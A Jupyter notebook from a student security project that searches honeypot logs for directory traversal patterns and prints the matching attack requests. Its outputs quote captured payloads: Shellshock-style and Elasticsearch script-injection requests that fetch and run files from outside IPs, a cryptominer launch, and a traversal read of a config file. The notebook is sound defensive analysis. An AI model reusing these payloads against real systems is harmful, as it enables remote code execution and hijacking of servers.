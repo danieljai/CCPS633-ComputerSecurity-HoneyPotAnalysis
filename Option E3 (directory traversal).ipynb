{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {
    "collapsed": true
   },
   "source": [
    "Option E – Attack Method Detection Part 1\n",
    "\n",
    "This option deals with creating a method to detect the following attack methods:  \n",
    "Chart and Graph by date, the following based on source IP and country.  \n",
    "1. Search for strings containing the characters which are known to be used in a Shellshock exploit.  \n",
    "2. Search for attempts where a website/webserver is being used that potentially hosts malware.  \n",
    "3. **Search for strings containing the characters which are known to be used in a directory transversal attack**  \n",
    "4. Search for cross site scripting (XSS) attacks. \n",
    " - (defintion) cross site scripting injecting malicious scripts into a the a vulnerable server's website.\n",
    " - A: most of the attacks are coming from US, with occasional attack originating from China and Russia.\n",
    "\n",
    "What types of threat actors are using the above attacks? Where are these attacks coming from? \n",
    "\n",
    "**Shockpot**  \n",
    "ShockPot is a web application honeypot that exposes the vulnerability CVE-2014-6271."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**hint**  \n",
    "For this you can create a graph for the two classifications of traversal attacks. The Y-axis would be the number of attacks and the X-axis would be the source IP. It would be hard to graph the traversal attack itself.\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Option E – Attack Method Detection Part 1\n",
    "\n",
    "This option deals with creating a method to detect the following attack methods:  \n",
    "** Chart and Graph by date, the following based on source IP and country. **\n",
    "\n",
    "#### 3. Search for strings containing the characters which are known to be used in a directory transversal attack"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "** Answer **\n",
    "Both Shockpot and Glastopf had directory traversal attempts"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<style>.container { width:90% !important; }</style>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "% matplotlib inline\n",
    "\n",
    "from IPython.core.display import display, HTML\n",
    "display(HTML(\"<style>.container { width:90% !important; }</style>\"))\n",
    "import numpy as np\n",
    "import pandas as pd\n",
    "pd.set_option('display.max_columns', 100)\n",
    "pd.set_option('display.height', 100)\n",
    "\n",
    "dfs = pd.read_csv(\"sorted-shockpot.csv\",sep='\\t', lineterminator='\\r')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "dfs = dfs.loc[:,['timestamp','source_ip',\n",
    "       'city', 'province', 'province_code', 'country', 'country_code','asn', 'method', 'path', 'URL',\n",
    "       'query_string', 'Authorization', 'Content-Type', 'Cookie', 'Host', 'Connection',\n",
    "       'Te', 'Accept-Encoding', 'User Agent', 'X_Forwarded_For',\n",
    "       'X_Requested_With', 'is-shellshock']].fillna(\"\")\n",
    "dfs = dfs.drop(dfs.index[5284])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "collapsed": true
   },
   "source": [
    "***"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "tracker=[]\n",
    "\n",
    "\n",
    "# define check function\n",
    "def chk3(chkdf,  searchlist, dfname, arr=tracker):\n",
    "    pd.set_option('display.max_rows', 500)\n",
    "    for i in range(8, len(chkdf.columns), 1):\n",
    "        result = chkdf[chkdf.iloc[:,i].str.contains(searchlist).fillna(False)]         \n",
    "        if result.iloc[:,1].count() != 0:\n",
    "            print(\"Found <\",searchlist,\"> in column <\", chkdf.columns[i],\"> count\",result.iloc[:,1].count())\n",
    "            arr.append([dfname,searchlist,chkdf.columns[i],result.iloc[:,1].count()])\n",
    "            return (result[['timestamp','source_ip','country','asn',chkdf.columns[i]]])\n",
    "            "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "***"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Shockpot"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Found < \\/etc\\/ > in column < path > count 1\n",
      "Found < \\.\\/ > in column < URL > count 1\n",
      "Found < \\/bin\\/ > in column < Content-Type > count 6\n",
      "Found < \\/tmp\\/ > in column < path > count 16\n",
      "Found < \\.\\. > in column < URL > count 1\n"
     ]
    }
   ],
   "source": [
    "dfs = pd.read_csv(\"sorted-shockpot.csv\",sep='\\t', lineterminator='\\r')\n",
    "dfs = dfs.loc[:,['timestamp','source_ip',\n",
    "       'city', 'province', 'province_code', 'country', 'country_code','asn', 'method', 'path', 'URL',\n",
    "       'query_string', 'Authorization', 'Content-Type', 'Cookie', 'Host', 'Connection',\n",
    "       'Te', 'Accept-Encoding', 'User Agent', 'X_Forwarded_For',\n",
    "       'X_Requested_With', 'is-shellshock']].fillna(\"\")\n",
    "dfs = dfs.drop(dfs.index[5284])\n",
    "\n",
    "# list of keywords i'm finding\n",
    "# https://andreafortuna.org/cybersecurity/how-a-malware-can-download-a-remote-payload-and-execute-malicious-code-in-one-line/\n",
    "# https://www.owasp.org/index.php/Path_Traversal\n",
    "# https://www.owasp.org/index.php/Testing_Directory_traversal/file_include_(OTG-AUTHZ-001)\n",
    "# test for querystrings\n",
    "mylist = {'\\.\\.','\\.\\/','\\.\\\\\\\\',\n",
    "          '\\%2e','\\%2f','\\%c1','\\%c0','\\%af','\\%2e','\\%2f','\\%5c','\\%1c','%252e','%255c',\n",
    "          '\\/tmp\\/','\\/bin\\/','\\/etc\\/','\\/www\\/','\\/var\\/','\\/passwd\\/','device','mnt',\n",
    "          'chroot',\n",
    "          #'\\?\\w*\\=.*\\.','\\?\\w*\\=.*\\/'\n",
    "         }\n",
    "\n",
    "\n",
    "dfs_1 = pd.DataFrame()\n",
    "for ix in mylist:\n",
    "    dfs_1 = pd.concat([dfs_1,chk3(dfs,ix,'shockpot')]).reset_index(drop=True)\n",
    "dfs_1 = dfs_1.drop_duplicates()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {
    "scrolled": false
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array([nan,\n",
       "       'http://192.168.10.5/etc/lib/pChart2/examples/imageMap/index.php?Action=ViewPHP&Script=../../../../../cnf/db.php',\n",
       "       nan, nan, nan, nan, nan, nan, nan, nan, nan, nan, nan, nan, nan,\n",
       "       nan, nan, nan, nan, nan, nan, nan, nan, nan], dtype=object)"
      ]
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "dfs_1['URL'].values"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {
    "scrolled": false
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array(['/etc/lib/pChart2/examples/imageMap/index.php', nan, nan, nan, nan,\n",
       "       nan, nan, nan, \"/;rm$IFS-f$IFS'/tmp/nmbt2.sh'\",\n",
       "       \"/;rm$IFS-f$IFS'/tmp/nmbt2.sh'\",\n",
       "       \"/;wget$IFS-O$IFS'/tmp/nmbt2.sh'$IFS'http://64.71.77.18/nmbt2.sh'\",\n",
       "       \"/;wget$IFS-O$IFS'/tmp/nmbt2.sh'$IFS'http://64.71.77.18/nmbt2.sh'\",\n",
       "       \"/;chmod$IFS'777'$IFS'/tmp/nmbt2.sh'\",\n",
       "       \"/;chmod$IFS'777'$IFS'/tmp/nmbt2.sh'\",\n",
       "       \"/;sh$IFS-c$IFS'/tmp/nmbt2.sh'\", \"/;sh$IFS-c$IFS'/tmp/nmbt2.sh'\",\n",
       "       \"/;rm$IFS-f$IFS'/tmp/nmbt2.sh'\",\n",
       "       \"/;wget$IFS-O$IFS'/tmp/nmbt2.sh'$IFS'http://208.110.66.154/nmbt2.sh'\",\n",
       "       \"/;chmod$IFS'777'$IFS'/tmp/nmbt2.sh'\",\n",
       "       \"/;sh$IFS-c$IFS'/tmp/nmbt2.sh'\", \"/;rm$IFS-f$IFS'/tmp/nmbt2.sh'\",\n",
       "       \"/;wget$IFS-O$IFS'/tmp/nmbt2.sh'$IFS'http://208.110.66.154/nmbt2.sh'\",\n",
       "       \"/;chmod$IFS'777'$IFS'/tmp/nmbt2.sh'\",\n",
       "       \"/;sh$IFS-c$IFS'/tmp/nmbt2.sh'\"], dtype=object)"
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "dfs_1['path'].values"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "***"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Glastopf"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Found < \\/var\\/ > in column < request_raw > count 22\n",
      "Found < \\/etc\\/ > in column < request_raw > count 1\n",
      "Found < \\.\\/ > in column < request_raw > count 9\n",
      "Found < \\/bin\\/ > in column < request_raw > count 4\n",
      "Found < \\/tmp\\/ > in column < request_raw > count 13\n",
      "Found < \\.\\. > in column < request_raw > count 5\n"
     ]
    }
   ],
   "source": [
    "dfg = pd.read_csv(\"sorted-glastopf.csv\",sep='\\t')\n",
    "dfg=dfg[['timestamp','channel','source_ip','destination_port',\n",
    "        'protocol','city','country','asn','Version','pattern',\n",
    "        'filename','request_raw','request_url']]\n",
    "dfg_1 = pd.DataFrame()\n",
    "for ix in mylist:\n",
    "    dfg_1 = pd.concat([dfg_1,chk3(dfg,ix,'Glastopf')]).reset_index(drop=True)\n",
    "dfg_1 = dfg_1.drop_duplicates()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {
    "scrolled": false
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array(['GET /etc/lib/pChart2/examples/imageMap/index.php?Action=ViewPHP&Script=../../../../../cnf/db.php HTTP/1.1, Accept-Encoding: gzip, Host: 192.168.10.6, User-Agent:',\n",
       "       'GET /_search?source={\"query\": {\"filtered\": {\"query\": {\"match_all\": {}}}}, \"script_fields\": {\"exp\": {\"script\": \"import java.util.*;import java.io.*;string str = /\"/\";bufferedreader br = new bufferedreader(new inputstreamreader(runtime.getruntime().exec(/\"wget http://192.161.49.113/25000_20170204;curl -o http://192.161.49.113/25000_20170204;chmod 777 25000_20170204;./25000_20170204/\").getinputstream()));stringbuilder sb = new stringbuilder();while((str=br.readline())!=null){sb.append(str);sb.append(/\"/r/n/\");}sb.tostring();\"}}, \"size\": 1} HTTP/1.1, Accept: text/html,application/xhtml xml,application/xml;q=0.9,image/webp,*/*;q=0.8, Accept-Encoding: gzip, deflate, Accept-Language: en-US, Connection: Keep-Alive, Host: 192.168.10.6, User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36',\n",
       "       'GET /_search?source={\"size\":1,\"query\":{\"filtered\":{\"query\":{\"match_all\":{}}}},\"script_fields\":{\"exp\":{\"script\":\"import java.util.*;/nimport java.io.*;/nstring str = /\"/\";bufferedreader br = new bufferedreader(new inputstreamreader(runtime.getruntime().exec(/\"wget -o /tmp/ssh http://27.151.29.225:9902/hald/\").getinputstream()));stringbuilder sb = new stringbuilder();while((str=br.readline())!=null){sb.append(str);}sb.tostring();\"}}} HTTP/1.1, Accept: text/html,application/xhtml xml,application/xml;q=0.9,image/webp,*/*;q=0.8, Accept-Encoding: gzip, deflate, Accept-Language: en-US, Connection: Keep-Alive, Host: 192.168.10.6, User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.63 Safari/537.36',\n",
       "       'GET /_search?source={\"size\":1,\"query\":{\"filtered\":{\"query\":{\"match_all\":{}}}},\"script_fields\":{\"exp\":{\"script\":\"import java.util.*;/nimport java.io.*;/nstring str = /\"/\";bufferedreader br = new bufferedreader(new inputstreamreader(runtime.getruntime().exec(/\"wget -o /tmp/uwfs http://118.123.119.110/uwfs/\").getinputstream()));stringbuilder sb = new stringbuilder();while((str=br.readline())!=null){sb.append(str);}sb.tostring();\"}}} HTTP/1.1, Accept: text/html,application/xhtml xml,application/xml;q=0.9,image/webp,*/*;q=0.8, Accept-Encoding: gzip, deflate, Accept-Language: en-US, Connection: Keep-Alive, Host: 192.168.10.6, User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36',\n",
       "       'GET /_search?source={\"query\": {\"filtered\": {\"query\": {\"match_all\": {}}}}, \"script_fields\": {\"exp\": {\"script\": \"import java.util.*;import java.io.*;string str = /\"/\";bufferedreader br = new bufferedreader(new inputstreamreader(runtime.getruntime().exec(/\"nohup /tmp/yam -c 1 -m stratum tcp://1234:1@23.106.133.70:8888/xmr > /dev/null 2>&1 &/\").getinputstream()));stringbuilder sb = new stringbuilder();while((str=br.readline())!=null){sb.append(str);sb.append(/\"/r/n/\");}sb.tostring();\"}}, \"size\": 1} HTTP/1.1, Accept: text/html,application/xhtml xml,application/xml;q=0.9,image/webp,*/*;q=0.8, Accept-Encoding: gzip, deflate, Accept-Language: en-US, Connection: Keep-Alive, Host: 192.168.10.6, User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36',\n",
       "       'GET /_search?source={\"query\": {\"filtered\": {\"query\": {\"match_all\": {}}}}, \"script_fields\": {\"exp\": {\"script\": \"import java.util.*;import java.io.*;string str = /\"/\";bufferedreader br = new bufferedreader(new inputstreamreader(runtime.getruntime().exec(/\"chmod 777 /tmp/yam/\").getinputstream()));stringbuilder sb = new stringbuilder();while((str=br.readline())!=null){sb.append(str);sb.append(/\"/r/n/\");}sb.tostring();\"}}, \"size\": 1} HTTP/1.1, Accept: text/html,application/xhtml xml,application/xml;q=0.9,image/webp,*/*;q=0.8, Accept-Encoding: gzip, deflate, Accept-Language: en-US, Connection: Keep-Alive, Host: 192.168.10.6, User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36',\n",
       "       'GET /_search?source={\"query\": {\"filtered\": {\"query\": {\"match_all\": {}}}}, \"script_fields\": {\"exp\": {\"script\": \"import java.util.*;import java.io.*;string str = /\"/\";bufferedreader br = new bufferedreader(new inputstreamreader(runtime.getruntime().exec(/\"chmod 777 /tmp/yam/\").getinputstream()));stringbuilder sb = new stringbuilder();while((str=br.readline())!=null){sb.append(str);sb.append(/\"/r/n/\");}sb.tostring();\"}}, \"size\": 1} HTTP/1.1, Accept: text/html,application/xhtml xml,application/xml;q=0.9,image/webp,*/*;q=0.8, Accept-Encoding: gzip, deflate, Accept-Language: en-US, Connection: Keep-Alive, Host: 192.168.10.6, User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36',\n",
       "       \"GET /default.php?pr='(..)'')., HTTP/1.1, Accept: text/html,application/xhtml xml,application/xml;q=0.9,*/*;q=0.8, Accept-Charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7, Accept-Encoding: gzip,deflate, Accept-Language: en-us,en;q=0.5, Cache-Control: no-cache,no-store, Connection: close, Host: 192.168.10.6, Pragma: no-cache, User-Agent: Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090716 Linux Mint/7 (Gloria) Firefox/3.5.1\",\n",
       "       'GET /gallery.php?showpage=\\'\"\"\\'(..\".( HTTP/1.1, Accept: text/html,application/xhtml xml,application/xml;q=0.9,*/*;q=0.8, Accept-Charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7, Accept-Encoding: gzip,deflate, Accept-Language: en-us,en;q=0.5, Cache-Control: no-cache,no-store, Connection: close, Host: 192.168.10.6, Pragma: no-cache, User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; en-us) AppleWebKit/533.4 (KHTML, like Gecko) Version/4.0.5 Safari/531.22.7',\n",
       "       'GET /pagina.php?q=)..\"(\\'\",), HTTP/1.1, Accept: text/html,application/xhtml xml,application/xml;q=0.9,*/*;q=0.8, Accept-Charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7, Accept-Encoding: gzip,deflate, Accept-Language: en-us,en;q=0.5, Cache-Control: no-cache,no-store, Connection: close, Host: 192.168.10.6, Pragma: no-cache, User-Agent: Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.354.0 Safari/533.3',\n",
       "       \"GET /pagina.php?q=,..(',().' HTTP/1.1, Accept: text/html,application/xhtml xml,application/xml;q=0.9,*/*;q=0.8, Accept-Charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7, Accept-Encoding: gzip,deflate, Accept-Language: en-us,en;q=0.5, Cache-Control: no-cache,no-store, Connection: close, Host: 192.168.10.6, Pragma: no-cache, User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.221.8 Safari/532.2\"],\n",
       "      dtype=object)"
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "dfg_1[dfg_1.request_raw.str.contains('\\?\\w*\\=.*\\.')].request_raw.values"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "***"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Elastic"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Found < \\.\\/ > in column < URL > count 12\n",
      "Found < \\/tmp\\/ > in column < URL > count 28\n"
     ]
    }
   ],
   "source": [
    "dfe = pd.read_csv(\"sorted-elastichoney.csv\",sep='\\t')\n",
    "dfe=dfe[['timestamp','channel','source_ip','destination_port',\n",
    "        'protocol','city','country','asn','method','type',\n",
    "        'URL','form','user_agent','Payload Connection','Payload','Payload Resource','Payload MD5']]\n",
    "\n",
    "dfe_1 = pd.DataFrame()\n",
    "for ix in mylist:\n",
    "    dfe_1 = pd.concat([dfe_1,chk3(dfe,ix,'Elastic')]).reset_index(drop=True)\n",
    "dfe_1 = dfe_1.drop_duplicates()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array(['192.168.10.4:9200/_search?source={\"size\":1,\"query\":{\"filtered\":{\"query\":{\"match_all\":{}}}},\"script_fields\":{\"exp\":{\"script\":\"import java.util.*;\\\\nimport java.io.*;\\\\nString str = \\\\\"\\\\\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\\\\\"curl -o /tmp/cysip http://116.48.48.14/cysip\\\\\").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();\"}}}',\n",
       "       '192.168.10.6:9200/_search?source={\"size\":1,\"query\":{\"filtered\":{\"query\":{\"match_all\":{}}}},\"script_fields\":{\"exp\":{\"script\":\"import java.util.*;\\\\nimport java.io.*;\\\\nString str = \\\\\"\\\\\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\\\\\"rm /tmp/*\\\\\").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();\"}}}',\n",
       "       '192.168.10.6:9200/_search?source={\"size\":1,\"query\":{\"filtered\":{\"query\":{\"match_all\":{}}}},\"script_fields\":{\"exp\":{\"script\":\"import java.util.*;\\\\nimport java.io.*;\\\\nString str = \\\\\"\\\\\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\\\\\"/tmp/./JrLinux\\\\\").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();\"}}}',\n",
       "       '192.168.10.6:9200/_search?source={\"size\":1,\"query\":{\"filtered\":{\"query\":{\"match_all\":{}}}},\"script_fields\":{\"exp\":{\"script\":\"import java.util.*;\\\\nimport java.io.*;\\\\nString str = \\\\\"\\\\\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\\\\\"chmod 777 /tmp/./JrLinux\\\\\").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();\"}}}',\n",
       "       '192.168.10.4:9200/_search?source={\"size\":1,\"query\":{\"filtered\":{\"query\":{\"match_all\":{}}}},\"script_fields\":{\"exp\":{\"script\":\"import java.util.*;\\\\nimport java.io.*;\\\\nString str = \\\\\"\\\\\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\\\\\"/tmp/qw\\\\\").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();\"}}}',\n",
       "       '192.168.10.4:9200/_search?source={\"size\":1,\"query\":{\"filtered\":{\"query\":{\"match_all\":{}}}},\"script_fields\":{\"exp\":{\"script\":\"import java.util.*;\\\\nimport java.io.*;\\\\nString str = \\\\\"\\\\\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\\\\\"wget -O /tmp/qw http://107.151.137.226:5648/qw\\\\\").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();\"}}}',\n",
       "       '192.168.10.6:9200/_search?source={\"size\":1,\"query\":{\"filtered\":{\"query\":{\"match_all\":{}}}},\"script_fields\":{\"exp\":{\"script\":\"import java.util.*;\\\\nimport java.io.*;\\\\nString str = \\\\\"\\\\\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\\\\\"/tmp/./root@p\\\\\").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();\"}}}',\n",
       "       '192.168.10.6:9200/_search?source={\"size\":1,\"query\":{\"filtered\":{\"query\":{\"match_all\":{}}}},\"script_fields\":{\"exp\":{\"script\":\"import java.util.*;\\\\nimport java.io.*;\\\\nString str = \\\\\"\\\\\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\\\\\"curl -o /tmp/JrLinux http://27.151.13.170:1234/JrLinux\\\\\").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();\"}}}',\n",
       "       '192.168.10.4:9200/_search?source={\"size\":1,\"query\":{\"filtered\":{\"query\":{\"match_all\":{}}}},\"script_fields\":{\"exp\":{\"script\":\"import java.util.*;\\\\nimport java.io.*;\\\\nString str = \\\\\"\\\\\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\\\\\"chmod 777 /tmp/qw\\\\\").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();\"}}}',\n",
       "       '192.168.10.4:9200/_search?source={\"size\":1,\"query\":{\"filtered\":{\"query\":{\"match_all\":{}}}},\"script_fields\":{\"exp\":{\"script\":\"import java.util.*;\\\\nimport java.io.*;\\\\nString str = \\\\\"\\\\\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\\\\\"chmod 777 /tmp/./cysip\\\\\").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();\"}}}'],\n",
       "      dtype=object)"
      ]
     },
     "execution_count": 10,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "dfe_1.sample(10).URL.values"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "***"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Cowrie"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "dfc = pd.read_csv(\"sorted-cowrie.csv\",sep='\\t')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "cowrie_tracker=[]\n",
    "\n",
    "dfc=dfc[['timestamp','channel','source_ip','destination_port',\n",
    "        'protocol','city','country','asn', 'commands', 'loggedin',\n",
    "       'version', 'ttylog', 'urls', 'session', 'payload_startTime',\n",
    "       'payload_endTime', 'credentials']]\n",
    "\n",
    "dfc_1 = pd.DataFrame()\n",
    "for ix in mylist:\n",
    "    dfc_1 = pd.concat([dfc_1,chk3(dfc,ix,'Cowrie',cowrie_tracker)]).reset_index(drop=True)\n",
    "dfc_1 = dfc_1.drop_duplicates()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "***"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Dionaea (omitted)\n",
    "\n",
    "- providing no results"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "dfd = pd.read_csv(\"sorted-dionaea.csv\",sep='\\t')\n",
    "\n",
    "dfd=dfd[['timestamp','channel','source_ip','destination_port',\n",
    "        'protocol','city','country','asn', 'remote_hostname',\n",
    "       'connection_transport', 'connection_type']]\n",
    "\n",
    "dfd_1 = pd.DataFrame()\n",
    "for ix in mylist:\n",
    "    dfd_1 = pd.concat([dfd_1,chk3(dfd,ix,'Dionaea')]).reset_index(drop=True)\n",
    "#dfd_1 = dfd_1.drop_duplicates()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "dfd_1"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "***"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Word (omitted)\n",
    "\n",
    "- returned one result but its values within password."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "collapsed": true
   },
   "source": [
    "dfw = pd.read_csv(\"sorted-wordpot.csv\",sep='\\t')\n",
    "\n",
    "dfw=dfw[['timestamp','channel','source_ip','destination_port',\n",
    "        'protocol','city','country','asn', 'URL', 'filename',\n",
    "       'user_agent', 'User Name', 'Password']]\n",
    "\n",
    "dfw_1 = pd.DataFrame()\n",
    "for ix in mylist:\n",
    "    dfw_1 = pd.concat([dfw_1,chk3(dfw,ix,'Word')]).reset_index(drop=True)\n",
    "dfw_1 = dfw_1.drop_duplicates()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "dfw_1.Password.values"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "df_tracker = pd.DataFrame(tracker,columns=['honeypot','regex','orig_col','attacks'])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>honeypot</th>\n",
       "      <th>regex</th>\n",
       "      <th>orig_col</th>\n",
       "      <th>attacks</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>shockpot</td>\n",
       "      <td>\\/etc\\/</td>\n",
       "      <td>path</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>shockpot</td>\n",
       "      <td>\\.\\/</td>\n",
       "      <td>URL</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>shockpot</td>\n",
       "      <td>\\/bin\\/</td>\n",
       "      <td>Content-Type</td>\n",
       "      <td>6</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>shockpot</td>\n",
       "      <td>\\/tmp\\/</td>\n",
       "      <td>path</td>\n",
       "      <td>16</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>shockpot</td>\n",
       "      <td>\\.\\.</td>\n",
       "      <td>URL</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5</th>\n",
       "      <td>Glastopf</td>\n",
       "      <td>\\/var\\/</td>\n",
       "      <td>request_raw</td>\n",
       "      <td>22</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6</th>\n",
       "      <td>Glastopf</td>\n",
       "      <td>\\/etc\\/</td>\n",
       "      <td>request_raw</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>7</th>\n",
       "      <td>Glastopf</td>\n",
       "      <td>\\.\\/</td>\n",
       "      <td>request_raw</td>\n",
       "      <td>9</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>8</th>\n",
       "      <td>Glastopf</td>\n",
       "      <td>\\/bin\\/</td>\n",
       "      <td>request_raw</td>\n",
       "      <td>4</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>9</th>\n",
       "      <td>Glastopf</td>\n",
